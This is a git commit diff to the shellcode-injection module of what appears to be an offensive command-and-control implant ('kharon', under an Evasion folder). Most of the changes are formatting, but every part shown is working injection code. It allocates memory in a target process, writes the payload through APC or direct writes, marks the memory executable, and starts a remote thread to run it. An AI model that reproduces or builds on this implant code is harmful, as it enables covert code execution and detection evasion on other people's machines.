a91742d7a67d627b15349ade49e5c6dc8b16235a
unknown <entropymalws@gmail.com>
2025-07-23 16:08:36 -0300

    local shellcode module done

--- Payload_Type/kharon/Agent/Source/Evasion/Injection.cc
+++ Payload_Type/kharon/Agent/Source/Evasion/Injection.cc
@@ -31,84 +31,83 @@ BOOL DECLFN Injection::Standard(
         PsHandle = Object->PsHandle;
     }
 
-    TempAddress = Self->Mm->Alloc(nullptr, FullSize, MEM_COMMIT, PAGE_READWRITE);
-    if (!TempAddress) {
-        if (PsHandle && !Object->PsHandle) Self->Ntdll.NtClose(PsHandle);
+    TempAddress = Self->Mm->Alloc( nullptr, FullSize, MEM_COMMIT, PAGE_READWRITE );
+    if ( ! TempAddress ) {
+        if ( PsHandle && ! Object->PsHandle ) Self->Ntdll.NtClose( PsHandle );
         return FALSE;
     }
 
     auto MemAlloc = [&](SIZE_T AllocSize) -> PVOID {
         PVOID addr = nullptr;
-        if (Self->Inj->Ctx.Alloc == 0) {
-            addr = Self->Mm->Alloc(nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle);
+        if ( Self->Inj->Ctx.Alloc == 0 ) {
+            addr = Self->Mm->Alloc( nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle );
         } else {
-            addr = Self->Mm->DripAlloc(AllocSize, PAGE_READWRITE, PsHandle);
+            addr = Self->Mm->DripAlloc( AllocSize, PAGE_READWRITE, PsHandle );
         }
         return addr;
     };
 
-    auto MemWrite = [&](PVOID Dst, PVOID Src, SIZE_T CopySize) -> BOOL {
+    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
         BOOL result = FALSE;
-        if (PsHandle == NtCurrentProcess()) {
-             if ( (BOOL)Mem::Copy(Dst, Src, CopySize) ) result = TRUE;
+        if ( PsHandle == NtCurrentProcess() ) {
+             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
              return result;
         } else if (Self->Inj->Ctx.Write == 0) {
-            result = (BOOL)Self->Mm->WriteAPC(PsHandle, Dst, (BYTE*)Src, CopySize);
+            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
         } else {
-            result = (BOOL)Self->Mm->Write(Dst, (BYTE*)Src, CopySize, 0, PsHandle);
+            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
         }
         return result;
     };
 
-    auto Cleanup = [&](BOOL BooleanRet = FALSE, SIZE_T MemSizeToZero = 0) -> BOOL {
-        
+    auto Cleanup = [&]( BOOL BooleanRet = FALSE, SIZE_T MemSizeToZero = 0 ) -> BOOL {
         SIZE_T DefaultSize = FullSize;
-        if (!MemSizeToZero) MemSizeToZero = DefaultSize;
+
+        if ( ! MemSizeToZero ) MemSizeToZero = DefaultSize;
 
         if ( BooleanRet && Object->Persist ) {
             Object->BaseAddress  = BaseAddress;
             Object->ThreadHandle = ThreadHandle;
             Object->ThreadId     = ThreadId;
         } else {
-            if (BaseAddress) {
-                Self->Mm->Free(BaseAddress, MemSizeToZero, MEM_RELEASE, PsHandle);
+            if ( BaseAddress ) {
+                Self->Mm->Free( BaseAddress, MemSizeToZero, MEM_RELEASE, PsHandle );
             }
-            if (PsHandle && !Object->PsHandle) {
-                Self->Ntdll.NtClose(PsHandle);
+            if ( PsHandle && !Object->PsHandle ) {
+                Self->Ntdll.NtClose( PsHandle );
             }
         }
-        if ( TempAddress  ) {
-            Self->Mm->Free(TempAddress, FullSize, MEM_RELEASE);
+        if ( TempAddress ) {
+            Self->Mm->Free( TempAddress, FullSize, MEM_RELEASE );
         }
         return BooleanRet;
     };
 
-    // Main injection logic
-    BaseAddress = MemAlloc(FullSize);
+    BaseAddress = MemAlloc( FullSize );
     if ( ! BaseAddress ) {
-        BaseAddress = MemAlloc(FullSize);
-        if (!BaseAddress) {
+        BaseAddress = MemAlloc( FullSize );
+        if ( ! BaseAddress ) {
             return Cleanup();
         }
     }
 
     
-    Mem::Copy((BYTE*)TempAddress, Buffer, Size );
+    Mem::Copy( (BYTE*)TempAddress, Buffer, Size );
     if ( ArgSize > 0 ) {
         Mem::Copy( (BYTE*)TempAddress + Size, ArgBuff, ArgSize );
         Parameter = (BYTE*)BaseAddress + Size;
     }
     
-    if (!MemWrite(BaseAddress, TempAddress, FullSize)) {
+    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
         return Cleanup();
     }
 
-    if ( ! Self->Mm->Protect(BaseAddress, FullSize, PAGE_EXECUTE_READ, &OldProt, PsHandle ) ) {
+    if ( ! Self->Mm->Protect( BaseAddress, FullSize, PAGE_EXECUTE_READ, &OldProt, PsHandle ) ) {
         return Cleanup();
     }
 
     ThreadHandle = Self->Td->Create( PsHandle, (BYTE*)BaseAddress, Parameter, 0, 0, &ThreadId );
-    if (ThreadHandle == INVALID_HANDLE_VALUE) {
+    if ( ThreadHandle == INVALID_HANDLE_VALUE ) {
         return Cleanup();
     }
 
